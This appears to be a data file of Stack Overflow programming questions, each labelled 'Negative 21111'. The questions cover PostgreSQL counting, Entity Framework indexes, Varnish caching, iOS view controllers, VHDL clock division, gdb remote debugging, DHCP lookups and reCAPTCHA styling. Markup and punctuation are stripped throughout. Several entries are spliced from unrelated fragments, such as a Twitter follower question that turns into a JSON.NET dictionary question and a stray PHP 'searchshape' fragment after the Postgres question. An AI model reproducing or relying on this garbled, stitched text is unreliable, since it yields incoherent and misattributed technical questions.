Negative 21111 pWhat I am trying to achieve is straightforward, however it is a little difficult to explain and I dont know if it is actually even possible in postgres. I am at a fairly basic level. codeSELECT, FROM, WHERE, LEFT JOIN ON, HAVINGcode, e.t.c the basic stuff.p  pI am trying to count the number of rows that contain a particular letternumber and display that count against the letternumber.p  pi.e How many rows have entries that contain an aA Case insensitivep  pThe table Im querying is a list of film names. All I want to do is group and count az and 09 and output the totals. I could run 36 queries sequentiallyp  precodeSELECT filmname FROM films WHERE filmname ilike a SELECT filmname FROM films WHERE filmname ilike b SELECT filmname FROM films WHERE filmname ilike c codepre  pAnd then run pgnumrows on the result to find the number I require, and so on.p  pI know how intensive like is and ilike even more so I would prefer to avoid that. Although the data below has upper and lower case in the data, I want the result sets to be case insensitive. i.e The Men Who Stare At Goats the aA,tT and sS wouldnt count twice for the resultset. I can duplicate the table to a secondary working table with the data all being strtolower and working on that set of data for the query if it makes the query simpler or easier to construct.p  pAn alternative could be something like br br  codeSELECT sumlengthregexpreplacefilmname, [Xx], , g FROM filmscodebr br  for each letter combination but again 36 queries, 36 datasets, I would prefer if I could get the data in a single query.p  pHere is a short data set of 14 films from my set which actually contains 275 rowsp  precodeDistrict 9 Surrogates The Invention Of Lying Pandorum UP The Soloist Cloudy With A Chance Of Meatballs The Imaginarium of Doctor Parnassus Cirque du Freak The Vampires Assistant Zombieland 9 The Men Who Stare At Goats A Christmas Carol Paranormal Activity codepre  pIf I manually lay out each letter and number in a column and then register if that letter appears in the film title by giving it an x in that column and then count them up to produce a total I would have something like this below. Each vertical column of xs is a list of the letters in that filmname regardless of how many times that letter appears or its case.p  pThe result for the short set above isp  precodeA  x x  xxxx xxx  9  B       x  x      2  C x     xxx   xx  6 D x  x  xxxx      6 E  xx  xxxxx x    8 F   x   xxx       4  G  xx    x   x    4 H   x  xxxx  xx   7 I x x  xxxxx  xx  9 J                 0 K         x       0 L   x  xx  x  xx  6 M    x  xxxx xxx  8 N   xx  xxxx x x  8 O  xxx xxx x xxx  10 P    xx  xx    x  5 Q         x       1 R xx x   xx  xxx  7 S xx   xxxx  xx   8 T xxx  xxxx  xxx  10 U  x xx xxx       6 V   x     x    x  3 W       x    x    2 X                 0  Y   x   x      x  3 Z          x      1  0                 0   1                 0   2                 0  3                 0 4                 0 5                 0 6                 0 7                 0 8                 0 9 x         x     1 codepre  pIn the example above, each column is a filmname As you can see, column 5 marks only a u and a p and column 11 marks only a 9. The final column is the tally for each letter.p  pI want to build a query somehow that gives me the result rows  A 9, B 2, C 6, D 6, E 8 e.t.c taking into account every row entry extracted from my films column. If that letter doesnt appear in any row I would like a zero.p  pI dont know if this is even possible or whether to do it systematically in php with 36 queries is the only possibility.p  pIn the current dataset there are 275 entries and it grows by around 8.33 a month 100 a year. I predict it will reach around 1000 rows by 2019 by which time I will be no doubt using a completely different system so I dont need to worry about working with a huge dataset  to trawl through.p  pThe current longest title is Percy Jackson amp the Olympians The Lightning Thief at 50 chars yes, poor film I know  and the shortest is 1, 9.p  pI am running version 9.0.0 of Postgres.p  pApologies if Ive said the same thing multiple times in multiple ways, I am trying to get as much information out so you know what I am trying to achieve.p  pIf you need any clarification or larger datasets to test with please just ask and Ill edit as needs be.p  pSuggestion are VERY welcome.p  pemEdit 1emp  pstrongErwinstrong Thanks for the editstagssuggestions.

I have asked my provider if they will try to update.p  pemResponseemp  pThanks for the excellent reply strongErwinstrongp  pApologies for the delay in responding but I have been trying to get your query to work and learning the new keywords to understand the query you created.p  pI adjusted the query to adapt into my table structure but the result set was not as expected all zeros so I copied your lines directly and had the same result.p  pWhilst the result set in both cases lists all 36 rows with the appropriate lettersnumbers however all the rows shows zero as the count ct.p  pI have tried to deconstruct the query to see where it may be falling over.p  pThe result of br p  precodeSELECT DISTINCT id, unneststringtoarraylowerfilm, NULL AS letter FROM  films codepre  pbr   is No rows found. Perhaps it ought to when extracted from the wider query, Im not sure.p  pWhen I removed the unnest function the result was 14 rows all with NULLp  pIf I adjust the functionbr p  precodeCOALESCEy.ct, 0 to COALESCEy.ct, 4ltbr gt codepre  pthen my dataset responds all with 4s for every letter instead of zeros as explained previously.p  pHaving briefly read up on COALESCE the 4 being the substitute value I am guessing that y.ct is NULL and being substituted with this second value this is to cover rows where the letter in the sequence is not matched, i.e if no films contain a q then the q column will have a zero value rather than NULLp  pThe database I tried this on was SQLASCII and I wondered if that was somehow a problem but I had the same result on one running version 8.4.0 with UTF8.p  pApologies if Ive made an obvious mistake but I am unable to return the dataset I require.p  pAny thoughtsp  pAgain, thanks for the detailed response and your explanations.p

I have tried putting searchshape alone as the name, searchshape[] as the name, everything. It just wont pass a value. p  pOn the dbquery page, I have tried outputting the value in several ways. I have tried printr, simple echo, setting a value as an explicit array and then setting that variable to the post result, etc etc etc.p  pI am at a loss.

Negative 21111 pI have a table schema where the primary key is a codeuniqueidentifiercode, and the clustered index is an identity column of type codebigintcode.p  pThe idea is that the Guid index is likely going to be fragmented and if its going to be fragmented I prefer that its not the clustered index because then it would really slow down insert. Ie I want the row inserted sequentially as much as possible.p  pHowever I do NOT want the clustered index propagated to the conceptual layer in EF. The clustered index is simply the physical location of the so said record and the programmers dont need to know anything about it. As far as they are concerned they are only dealing with the Guid PK. So I removed the property from the models.p  pThe project compilation complains however that the clustered index column is non nullable, and has no default value, either of which is nonsensical considering it is an identity column and can neither have a default value or be nullable.p  pWhat can I do to get the project to compilep  pNote I do not want a debate about Guid vs. Sequential Guid vs. Int Id. This system must be able to scale out and that means Guid PK where Im concerned.p

Negative 21111 pwe recently have put Varnish in front of our Drupal because the server was suffering heavy load and we are very pleased in general.p  pThe only problem remaining is that we sometimes have an infinite redirection loop in the cached data.

The page in the cache sometimes contains the full front page, but with a Location header set, that sends the user to the front page again.p  pWe are not quite sure what could cause this, but also have no clue on how could track this down. Of course, the best way to handle this would be on the drupal side, but we cant really tell why this does happen.p  pIs there a way to log the cases when this happens Or is it possible to detect this in varnish and mark the current cache content as invalidp  pOf course, we dont want to always pass intentional redirects to the origin server, but the ones that would cause an infinite loop.p  pI hope to hear some ideas how we can further track this down. Many thank in advance for all kinds of hints.p

Negative 21111 pSo Ive been a developer on a one man team for a few years now.  I came to recognize the benefit of separating all of the design, html, and css work into the hands of the more gifted individuals, so I started a business, made up of other longtime 1 man teams who were limited to static websites that looked gorgeous.  You can imagine what comes next.p  pWeve been using Zend Framework PHP applications for most applications, which separates most of the view code from business and data layers, but occasionally one of the designers or frontend guys has to tinker with a model or view script, and Im starting to have coordination nightmares for who is updating what files and when so we dont overwrite anyones important changes in the dev environment. obviously waiting for stability before production deploymentp  pI work with NetBeans on my local, while the others use dreamweaver.  What Im looking for is a tool that can manage file versions on the dev server, allowing check incheck out, so nobody is working on the same file at the same time. or better yet, merges changesp  pAny suggestions on a good tool for this  Would a CI tool be better or a VCS tool The only other option I can think of is to work directly on a development server, deploy to a simprod environment, than after testing, move to prod, but I like being able to develop behind a firewall before putting something on the internet. Any recommendations would be helpful.p  pThank you.p

Negative 21111 pSo I have a codeUIViewControllercode inside a codeUIViewControllercode and inside a codeUIViewControllercode and I am trying to adjust its frame. However when I call codesetFramecode, it calls the codeviewDidLoadcode of that particular view controller I am trying to adjust the frame. However at that time the codeframeSizecode isnt the one that I set. In this codeviewDidLoadcode I am also calling a private method called codeloadDataFromServercode, which pulls in data from memory first and then make a call to the server. Because its loading data from memory, it does it really quick, basically before viewDidLoad is finished and therefore the frame size hasnt been adjusted yet. So I see the view with the wrong sizelayout first and then it adjusts after getting data from the server, which at this point codeviewDidLoadcode is finished and the frame is adjusted well. p  pIf I move the codeloadDataFromServercode call to codeviewDidAppearcode then it all looks fine. The thing is that I am not sure when codeviewDidAppearcode is called. Is it called after codeviewDidLoadcode once Or is it called after codeviewWillAppearcode Any ideawork around for thisp  precode    ContainerViewController vc  [self.storyboard instantiateViewControllerWithIdentifierContainerViewController]     vc.delegate  self      UINavigationController newsfeedNavController  [[UINavigationController alloc] initWithRootViewControllervc]      [self addChildViewControllernewsfeedNavController]     newsfeedNavController.view.frame  CGRectMake0, 0, self.view.frameWidth, self.view.frameHeight     [self.view addSubviewnewsfeedNavController.view]     [newsfeedNavController didMoveToParentViewControllerself]     [newsfeedNavController release] codepre

Negative 21111 pIm having this categorized view displayed in a view panel where the category column itself is not shown. Instead Im displaying a combobox above the viewPanel where users can select from all the categories available see screenshot below. The combo is bound to a scopeVariable and is refreshing the viewPanel onChange. The viewPanel has a computed categoryFilter reading from the same scopeVar. That all works nicely.p  pNow I also have implemented an additional wildcard  value in the selection list which if selected programmatically sets the cat filter to NULL. This way Im forcing the viewPanel to show all entries. Again, this works fine, but with the drawback that now the view is showing empty rows where the category entries would be shown normally in the screenshot you see empty rows above each entry, with 2 entries for the category edcom GmbH obviously belonging to the same category those arent separated by an empty rowp  pimg srchttpi.stack.imgur.comcVOrc.png altenter image description herep  pOne way to at least hide those empty rows would be through means of css coding. But I would prefer those rows not being rendered at all.p  pCan this be done at all using a viewPanel, and how Or do I have to use other controls like a repeat or a dataTable maybep  pThanks in advance,p  pLotharp

Negative 21111 pI have a Mac application that is supposed to fetch Twitter followers and friends for a given username and then, in turn, ask Twitter for the user NAMES for each of those returned UserIDs.

Instead Id like to store everything in a generic dictionary, and have a single stronglytyped property Id which looks for id, custid or customerId in the dictionary making it transparent for the UI.p  pThis system works great with JSON.NET, however if ever the server returns an object hierarchy, subobjects will be stored as JObjects in my dictionary instead of another dictionary.p  pTo sumup, Im looking for an efficient system to transform an object hierarchy into a hierarchy of codeDictionaryltstring, objectgtcode using a JSON serializer available in WinRT.p

The code doesnt fail at all, so the controllers just updating a hidden outlet. p  pHow do I target the correct outlet for a nested view in Ember At best, I seem to be able to hit the sidebar outlet, but not the outlet within a nested device template. And is this a reasonable structure for implementing contextual menus in ember in the first place p  pemem For clarification With my current setup, each device item is rendered using the same template. When selected, the sidebar outlet would update with some devices meta information, while the selected device view would also connect its outlet to an edit menu. Only one device item would have its edit outlet connected at a time.p  pDoes it make sense to even use an outlet here, or should I be dropping conditional logic into the template in order to display the edit menus as necessaryp  pstrongUpdate to restate the best practices portion of the questionstrongp  pOutlets seem to be great for decoupling components, and futureproofing potential view nestings. But right now it seems like accessing the correct outlet for a nested view is a bit cumbersome. Further, if you always know what components will be conditionally nested within a template, it seems easiestto just hardcode your views. egp  precode within template used for individual resultlist items if condition     view reusableSubView if  codepre  pWhat is the preferred ember way of doing things here Is there any overhead to creating outlets that may not necessarily be connected at all times p

Obviously I wont have access to Active Directory or tools like that. Thank you in advance.p

Negative 21111 pCan a hardware failure e.g. RAM corruption manifest itself as irrational but consistent behaviour in a C programp  pToday I witnessed very strange behaviour from a program I have been working on for the past year or so. Its written in C and Im using Visual Studio 2010. There were two instances of inexplicable behaviour.p  pThe first involved a particular classs constructor. After I made some code changes elsewhere, not in the constructor and rebuilt the project, memory spiked to maximum and froze my OS similar to a a hrefhttpstackoverflow.comquestions8489641cfullsystemcrashreleasemodeonlyproblema I had a year ago which was due to optimisations, but this time optimisations were disabled. Upon debugging, I realised that breakpoints werent accessible in the constructor, meaning that no code was being generated. If I added a couple of member variables in a struct somewhere else in the code, the constructor magically worked again.p  pThe second instance involved a method A calling a method B and passing a parameter. When debugging, the variable being passed was a valid string before being passed to B. Once at B, the parameter was empty. A system restart made things work fine again.p  pThis made me think that there might be a problem with my RAM  after restarting, the program would maybe run in a different portion of memory, and so not run into problems. The machine Im working on did experience several blue screens in the past, though not regularly. A run of the Windows memory diagnostic tool did not reveal problems, but Im still suspicious.p  pIts easy to blame the environment when you have no clue why things are happening, but I really never saw anything like this before. I just wanted to ask whether it would make any sense for malfunctioning hardware to affect a program like this.p

Negative 21111 pIve participated in several projects of Springbased webapplication  and have written a quantity myself.

Negative 21111 pFinal edit for clarity  In my environment, DNS will only store one record per client. If a client has multiple NICs, or changes subnets, the original IP is registered in DNS until the corresponding DHCP record expires this is an AD environment where DHCP registers DNS addresses.p  pIn this scenario DNS has one, incorrect, record for the client. I want to query DHCP by client name, to see all IPs that are leased to it.p  pThe only possible solution I have found is to dump all subnet info from DHCP supported by the below API then query against that, but that is not feasible in my environment, since multiple people would use this application, and I dont want the additional strain on DHCP.p  pI cannot change any configuration for DNS or DHCP.p  pThanks,p  hr  pThis is similar to a hrefhttpstackoverflow.comquestions2224877queryingadhcpserverincsharpthisa question, but with the referenced API a hrefhttpmsdn.microsoft.comenuslibraryaa36337928vvs.8529.aspx relnofollowherea, I can only query via IP. Is it possible with this API, or any other, to query DHCP by hostname The issue being, DNS gives me an old IP for MachineA, I want to retrieve any other IPs being leased by MachineA from the DHCP server.p  pEdit To clarify, I want to write a program that I can type in a hostname, it will then query a DHCP server for all IPs for that hostname in any subnet administered by that DHCP server. This is to workaround the issue of a machine with multiple NICs registering an IP that is useless to me wireless, so for instance the DNS result may be NICA wireless but I want NICB wired.p
Negative 21111 pIm developing a singlepage web app using Knockout and jQuery. The body of the page is divided into different codeltsectiongtcodes, each of which corresponds to a certain page the user will only see one section at once. Were using Knockouts codevisiblecode binding to hide and show the sections as appropriate, and it works fine.p  pThe problem is that as the page is loadingwhen the HTML has loaded but Knockout has not yet applied its bindingsall of the sections are visible. This lasts for less than a second, but it is unsightly. I tried to set codedisplay nonecode on the sections so that they would be invisible initially, but theres a quirk with a hrefhttpknockoutjs.comdocumentationvisiblebinding.html relnofollowKnockouts codevisiblecode bindinga if the expression evaluates to true, Knockout sets the CSS codedisplaycode property to whatever it would have been without Knockout.p  pIn other words, setting codedatabindvisible truecode will not override codedisplay nonecode. This makes sense, since there are often situations when you need to specify the display as either invisible or, say, codetablecellcode, but its annoying in my case. Whats the best way to force Knockout to show my section elementsp

Negative 21111 pemId post this in EE but it seems there are far more VHDL questions here...emp  pstrongBackgroundstrong Im using the Xilinx Spartan6LX9 FPGA with the Xilinx ISE 14.4 webpack.p  pI stumbled upon the dreaded PhysDesignRules372  Gated clock warning today, and I see theres a LOT of discussion out there concerning that in general. The consensus seems to be to use one of the DCMs on the FPGA to do clock division but... my DCM doesnt appear to be capable of going from 32 MHz to 4.096 KHz per the wizard it bottoms out at 5MHz based on 32MHz... and it seems absurd to try to chain multiple DCMs for this lowfrequency purpose.p  pMy current design uses clkin to count up to a specified value 15265, resets that value to zero and toggles the clkout bit so I end up with a duty cycle of 50, FWIW. It does the job, and I can easily use the rising edge of clkout to drive the next stage of my design. It seems to work just fine, but... emgated clockem even though it isnt in the range where clock skew would IMHO be very relevant. Note All clock tests are done using the risingedge function in processes sensitive to the given clock.p  pSo, my questionsp  ul lipIf were talking about deriving a relatively slow clkout from a emmuch fasterem clkin, is gating still considered bad strongOr is this sort of count to x and send a pulse thing pretty typical emfor FPGAsem to generate a clock in the KHz range and instead some other unnecessary sideeffect may be triggering this warning insteadstrongpli lipIs there a better way to create a low KHzrange clock from a MHzrange master clock, keeping in mind that using multiple DCMs appears to be overkill here if its possible at all given the very low output frequency I realize the 50 duty cycle may be superfluous but assuming one clock in and emnotem using the onboard DCMs how else would one perform major clock division with an FPGApli ul  pEdit Given the following where CLKMASTER is the 32 MHz input clock and CLKSLOW is the desired slowrate clock, and LOCALCLKSLOW was a way to store the state of the clock for the whole dutycycle thing, I learned that this configuration causes the warningp  precodearchitecture arch of clock is     constant CLKMASTERFREQ natural  32000000  time  31.25 ns     constant CLKSLOWFREQ natural  2048     constant MAXCOUNT natural  CLKMASTERFREQCLKSLOWFREQ     shared variable counter natural  0     signal LOCALCLKSLOW STDLOGIC  0 begin     clockproc processCLKMASTER     begin         if risingedgeCLKMASTER then             counter  counter  1             if counter gt MAXCOUNT then                 counter  0                 LOCALCLKSLOW lt not LOCALCLKSLOW                 CLKSLOW lt LOCALCLKSLOW             end if         end if     end process end arch codepre  pWhereas this configuration does NOT cause the warningp  precodearchitecture arch of clock is     constant CLKMASTERFREQ natural  32000000  time  31.25 ns     constant CLKSLOWFREQ natural  2048     constant MAXCOUNT natural  CLKMASTERFREQCLKSLOWFREQ     shared variable counter natural  0 begin     clockproc processCLKMASTER     begin         if risingedgeCLKMASTER then             counter  counter  1             if counter gt MAXCOUNT then                 counter  0                 CLKSLOW lt 1             else                 CLKSLOW lt 0             end if         end if     end process end arch codepre  pSo, in this case it was all for lack of an else like I said, the 50 duty cycle was originally interesting but wasnt a requirement in the end, and the toggle of the local clock bit seemed quite clever at the time... I was mostly on the right track it appears.p  pstrongWhats not clear to me at this point is why using a counter which stores lots of bits isnt causing warnings, but a storedandtoggled output bit emdoesem cause warnings.strong Thoughtsp

Negative 21111 pIve been working on a kind of spaceship game in which you take a lander and take off from the ground and fly up as high as you can get until you come crashing down.  The problem Ive been running into is that the camera that Ive tried to implement doesnt keep the lander in the center, the lander eventually gets faster then the camera and goes off screen.  I dont understand why and Ive tried everything to make it work.  I created a test case in which I used the camera on a simple program where a sprite moved in four directions.  That one worked fine, but when I implemented the camera on my main game, it doesnt work correctly.

Negative 21111 pI am new to C.  I am writing a program in which a list changes size depending on user input.  The list is of GPS coordinates so it is p  precodeListltdouble[]gt coordinates new Listltdouble[]gt codepre  pHowever I  have a function that needs the GPS coordinates in codedouble[][]code format, an array of arrays.  It seems like this would be very straightforward because it seems like a list of arrays is already an array of arrays.  However, the most logical thing I can think to do failsp  precodedouble[][]test  new double[][]  test  coordinates.ToArray codepre  pwith Cannot convert method group ToArray to nondelegate type double[][]. Did you intend to invoke the methodp  pNot sure what that means or how to fix. Any advice is appreciated.p
Negative 21111 pI am currently working on a project that i am trying to add an icon making competition and the winner will receive a special app plugin that only the contest winner will get and i would like my app to check if the packagespecial app plugin exists on the users device and if it does i would like the app to display an alternate display on runtime.Would i use if and else statements to achieve this and if so how would i go about this and Thanks in advanced.p  pNoteI have successfully made the app load a different layout depending on the android version so i have a little bit of an idea but need some help. p

Negative 21111 pIn my app I am running a server in the background. I am using a codeNSOperationcode to do so.

I also have no control to the implementation of that function.p  pOccasionally, the user changes the settings of the server. When this occurs, I would like to stop and then restart the server.

Negative 21111 pWe have a process that starts longrunning tasks via the ThreadPool.QueueUserWorkItem command.p  pEach task inside, loads a new AppDomain via AppDomain.CreateDomain call, processes a bunch of stuff and exits.

The best way for me to kill the thread is to unload that appdomain as done in the finally clause of the overall trycatch.

Negative 21111 pIve spent several hours trying minor variations of this code, and I dont understand why one works and the other doesnt.p  pHeres the scenario Im trying to present a list of registered users which Im getting with a simple database query that returns just a few columns, then when one users name is clicked on, Ill retrieve more information about that user from the database, and present it in a different view. At the moment, Im doing this with regular codeltagtcode elements with an codengclickcode directive that sets a value called codecurrentidcode. Elsewhere in my code, I use codewatchcode to send out a new database query whenever codecurrentidcode changes. That part seems to be working I see the codeconsole.logcode output from my watch callback, and the database query is spitting out the right data... but sometimes codecurrentidcode changes, and sometimes it doesnt, and I cannot figure out why.p  ul liA jsfiddle where it doesnt work a hrefhttpjsfiddle.netaLcRL11httpjsfiddle.netaLcRL11ali liA jsfiddle where it DOES work a hrefhttpjsfiddle.netaLcRL12httpjsfiddle.netaLcRL12ali ul  pClick on the rmunn and admin links in the table the Currrent ID value below should update. And please pardon the almost total lack of CSS Im a coder, not a graphics designer Dammit, Jim, and its also very late in my timezone right now so I have no motivation to pretty this up. Its functional, it demonstrates the problem, and Im going to leave it at that.p  pThe only difference between these two is that one is binding to codecurrentidcode, and the other is binding to codevars.currentidcode. Now, I understand why binding to codecurrentidcode wouldnt work in the case of a parent and a child scope the childs value would overshadow the parents value since Im coming from a Python background, this makes sense to me its similar to how Pythons instance namespaces can shadow the namespaces of anything defined on the class. But in this jsfiddle, Im only using one controller  arent all these variables in the same scopep  pIve been beating my head against this all day, and the several Stack Overflow answers Ive tried to read like a hrefhttpstackoverflow.comquestions9682092databindinginangularjsDatabinding in angularjsa for example have just left me even more confused codeapplycode and codedigestcode and scopes, oh my So if anyone can give me a nice simple beginners guide to scopes in Angular or point me to an alreadywritten one that Ive missed, Id be very grateful.p  pIve learned Clojure and Haskell, I can learn a simple Javascript framework, I thought.

Negative 21111 pI am trying to do remote debugging in CDT Environment of Eclipse Juno on Windows 7, whereas the remote machine is running under Linux.

There exists another application Z that is started first, then I trigger a specific function so that my application Y is loaded dynamically. Actually it is done from a database stored procedure, but I will leave out these details to avoid fully puzzling you...li liI have my local machine C running under Windows from which I want to debug. I have a copy of Ys source code and executable there, but not from application Z. li liI cannot change these settings.li ul  pNow, I have installed gdbserver GNU gdbserver GDB SUSE 7.23.3 on machine B, gdb on machine C  compiled it with matching target and host as found in common tutorials, the version output says the followingp  precode    GNU gdb GDB 7.6.50.20130508cvs cygwinspecial     Copyright C 2013 Free Software Foundation, Inc.

GDB will be unable to debug shared library initializers and track explicitly loaded dynamic code. Created trace state variable tracetimestamp for targets variable 1. codepre  pI have read something about including shared libraries somewhere, but I did not fully understand what shared libraries are meant here. Maybe that issue is also related to the next point.pli liI do not know where to include my source code so that it is available for setting breakpoints etc. during the debugging session. Since I do not have an Eclipse project, I know I just need to include the path to it somewhere. I added the codes root folder to the debug configurations source lookup path, but this does not seem to work.li liIn Eclipses debug configuration, I enter the path to the C application I want to start. For the command on the remote machine, I need to enter application Z since I cannot start my application Y explicitely. So I entered my application Ys path in the field for my local C application. Is that correct li liWhen starting the debugging session and triggering my application Y from outside, nothing happens in the debugger. My application Y is running and delivers results, but I do not get anything in the debuggers console. I would like to set breakpoints, but since my source code is not found I do not know how...li ul  pI tried to do a gdb debugging directly on the remote machine starting applicatioin Z, triggering application Y from outside and tried to set breakpoints at specific functions from my application Y. But this did not work either. Nevertheless, I did not get the warning mentioned above.p  pSo now I am stuck here and do not know what to do. I have read lots of threads and blogs, but none of them has such a specific setting as I have, so there is always missing some detail. p  pI really, really, really appreciate your help. p

Negative 21111 pSo, I have a recaptcha widget added to forms within a site Im working on. Im using the widget on several different pages, but am only having the problem on one of them. I am only having this problem in chrome.p  pWhen the page is first loaded, the widget doesnt appear at all. And I dont mean just the image I mean the whole widget It acts as if displaynone was applied to it as its not taking up any space and none of its elements even those which are literally written into the html are visible. p  pIt consistently appears when I mouseover a submit button after it. Once the widget has appeared, it stays put and doesnt flicker or anything. It will also magically appear if I change ANY of the styles for any of the elements in chromes web inspector.p  pThe crazy thing is that I looked through every element of the widget and there are not any styles relating to it that would cause nothing to take up space. It totally blows my mind.p  pSo, hopefully this is something people know about. Ill post code, but I dont know how useful it will be out of context. p  pstrongHTMLstrongp  precodeltdiv idrecaptchawidget styledisplaynonegt     ltdiv idrecaptchaimagegtltdivgt     ltdiv classrecaptchaonlyifincorrectsol          stylecolorredgtOops Please try again.     ltdivgt     ltdiv classrecaptchalinksgt         ltdiv classrecaptcharefreshboxgtlta             hrefjavascriptRecaptcha.reload             titleGet another CAPTCHAgtltagtltdivgt         ltdiv classrecaptchaonlyifimagegt             lta hrefjavascriptRecaptcha.switchtypeaudiorecaptcharesponsefield.attrplaceholder, Enter the numbers you hear titleGet an audio CAPTCHAgtltagt         ltdivgt         ltdiv classrecaptchaonlyifaudiogt             lta hrefjavascriptRecaptcha.switchtypeimagerecaptcharesponsefield.attrplaceholder, Type the two words above titleGet an image CAPTCHAgtltagt         ltdivgt         ltdiv classrecaptchahelpgt             lta hrefjavascriptRecaptcha.showhelp titleHelpgtltagt         ltdivgt     ltdivgt     ltbrgt     ltinput typetext idrecaptcharesponsefield namerecaptcharesponsefield placeholderType the two words abovegt     ltspan classrecaptchacreditgtreCAPTCHAltspangt ltdivgt  ltscript typetextjavascript         srchttpwww.google.comrecaptchaapichallengek6LfMxd4SAAAAAAqJZtKSb2Z4ilabUaMZiTyBGpGugt ltscriptgt ltnoscriptgt     ltiframe         srchttpwww.google.comrecaptchaapinoscriptk6LfMxd4SAAAAAAqJZtKSb2Z4ilabUaMZiTyBGpGu         height300 width500         frameborder0gtltiframegt     ltbrgt     lttextarea namerecaptchachallengefield rows3 cols40gt     lttextareagt     ltinput typehidden namerecaptcharesponsefield valuemanualchallengegt ltnoscriptgt codepre  pstrongCSSstrongp  precode    recaptchawidget      clear both     margin 0 auto 15px     width 400px     backgroundcolor 40403E     padding 8px 8px 0     borderradius 4px     display block     float left     textalign left   recaptchaimage      float left     padding 0 5px 5px 0   recaptchaimage img      borderradius 2px   recaptcharesponsefield      width 282px     paddingleft 8px     backgroundimage none     clear both     margintop 10px   form.onwhite recaptcharesponsefield      color white   recaptchawidget .recaptchalinks      display inlineblock     position relative     width 95px     height 57px   recaptchawidget .recaptchalinks div      width 40px     height 25px     display inlineblock     background 595957     borderradius 2px     textalign center     position absolute   recaptchawidget .recaptchalinks div.recaptcharefreshbox      width 50px     height 57px     top 0     left 0   recaptchawidget .recaptchalinks .recaptchaonlyifaudio, recaptchawidget .recaptchalinks .recaptchaonlyifimage      top 0     left 55px   recaptchawidget .recaptchacredit      marginleft 10px     color 666   recaptchawidget .recaptchalinks .recaptchahelp      top 32px     left 55px   recaptchawidget .recaptchalinks a      backgroundimage url..imagesrecaptchasprite.png     display inlineblock     float none    recaptchawidget .recaptchalinks .recaptcharefreshbox a      width 32px     height 37px     backgroundposition 0 0     margintop 9px   recaptchawidget .recaptchalinks .recaptchaonlyifimage a      width 19px     height 17px     backgroundposition 48px 20px     margintop 3px   recaptchawidget .recaptchalinks .recaptchaonlyifaudio a      width 28px     height 13px     backgroundposition 36px 3px     margintop 5px   recaptchawidget .recaptchalinks .recaptchahelp a      width 10px     height 15px     backgroundposition 35px 21px     margintop 5px     centralbox is an ancestor of the problem child   centralbox recaptchawidget      width 330px     position relative   centralbox recaptchawidget .recaptchalinks      float right   centralbox recaptchawidget .recaptchalinksdiv      float left   centralbox recaptchawidget .recaptchalinksdiv span      displayblock     textalign right   centralbox recaptchawidget .recaptchalinksdiv input      width 210px     margintop 0  codepre  pstrongJSstrongp  precodevar RecaptchaOptions   theme custom, customthemewidget recaptchawidget , RecaptchaInput  recaptcharesponsefield codepre

Negative 21111 pWe use Spring IoC and Struts as the web app framework. There is a helper class in the presentation layer which reads some stuff from request and populates some data as request attributes for the action and other classes to use. So we need the request object HttpServletRequest in this class, and we use ServletActionContext.getRequest for this. p  pThe helper class is a Spring bean in request scope, and gets invoked for all requests. The data loading happens in a method which is configured as initmethod in the helpers Spring bean. The actions are also Spring beans.p  pIn struts.xml, we refer to the action beans configured in spring by name. For egp  precodeltaction namemyAction classactionBeanNameFromSpringgt     ltresultgtmyResult.jspltresultgt ltactiongt codepre  pIn this case, the ServletActionContext.getRequest method in the helper returns the proper request object. However, we have other actions in the XML where we directly refer to the action class instead of action bean i.e. we bypass Spring. In these cases, the request comes out as null.p  pNow I know that the solution to this is to change all action entries in XML to refer to Spring beans. But I would like to know why exactly this happens. AFAIK, ServletActionContext is a Struts thing and is handled completely by Struts. How does going through Spring i.e. using Spring action beans populate the context, and not going through Spring i.e. using Action class name doesntp  pRomanp  pI am assuming the entire content is unnecessary.

Negative 21111 pIm trying to parse 802.11 frames myself and Ive encountered two problems that I cant solve.p  pFirst of all, when does an LLC Logical Link Control header follow a IEEE 802.11 data frame  I thought when there is data in a frame, there would always be an llc overhead preceding the data, but I have a wireshark with Ethernet II instead of LLC. But I have no idea how to actually know if its gonna be an LLC or a Ethernet II header following my 802.11 data header. Theres no field in the 802.11 header specifyin whats following. p  pSecondly, I have noticed something in wireshark when I open a capture file containing 802.11 QoS data frames. At the end of the header theres the QoS control field, which is normal, its specified in the IEEE 802.11 documentation ive read it over and over again to try to find an answer to my question But then, theres 2 bytes that wireshark considers part of the 802.11 header when you click on the raw bytes, wireshark points to the 802.11 header, but the signification of the bytes is not displayed in the fields of the header  Does my question make any sense p  pHere are images to explain what Im not understanding. On the first screen shot below, you see the 802.11 header selected and you see below the concerned bytes in hexadecimal. img srchttpi.stack.imgur.comtQa04.png altEntire 802.11 headerp  pPay attention to the last bytes of this packet00 00 10 aa p  pNow I expand the 802.11 header and click on the very last field of it QoS control, as specified in the RFC. You can see that the corresponding bytes are 00 00. But those bytes are not the last bytes of the packet  There still is 10 aa thats part of the wifi packet but I have no idea what those bytes represent p  pimg srchttpi.stack.imgur.comcuj85.png altlast field selectedp  pAny one has an idea p

Negative 21111 pI have created an app which uses location updates in the background. I have submitted my app to apple but it got rejected by apple on the ground that you are using location updates in background rather than using significant location update and shape based region monitoring.  My app takes location updates and provided user with specific updates, which works perfectly for my scenarios and have made code to better save battery. With Apples suggested approach the problem Im getting with significant location update and shape based region monitoring is location accuracy. With significant location update I get events fired for all the region within that cell tower range or say 100 m  3000 m rather than when user enters a region say lat long with 100 m radius.  Ive had many conversations with apple and they dont seem to care about the developers and new technologies they are creating.  Is there any developer who faced same problem of using background location update to do something other than navigation and got accepted or has anyone used significant location update with shape based monitoring to provide precise updates with better location accuracy. p  pAny help is much much appreciated. p

Negative 21111 pThis is a pretty simple idea conceptually. In terms of specifics, Im working with a pretty generic Kotti installation, where Im customizing some pages  templates.p  pMuch of my configuration is shared between a production and development server. Currently, these settings are included in two separate ini files. It would be nice to DRY this configuration, with common settings in one place.p  pIm quite open to this happening in python or an an ini file  section or perhaps a third, yettobeconsidered place. I think its equivalent to use a [DEFAULT] section, or pass dictionaries to codeloadappcode via codeglobalconfcode, but that seems to be processed in a squirrelly way. For example, Kotti thinks Ive properly set sqlalchemy.url, but sqlalchemy iteself fails on codeurl  opts.popurlcode. Moreover, since Kotti defines some default settings, Paste doesnt end up searching for them in the globalconf e.g., codekotticonfiguratorscode. p  pI strongdontstrong like the idea of passing in a large dict for codevarscode substitution, as it requires effectively renaming all of the shared variables.p  pIn my initial experiments with Paste Deploy, it demands a main section in each ini file. So, I dont think I can just use a codeuse  configshared.inicode line. But thats conceptually close to what Id like to do.p  pIs there a way to explicitly and properly include settings from DEFAULT or codeglobalconfcode Or perhaps do this programmatically with python on the results of loadappp

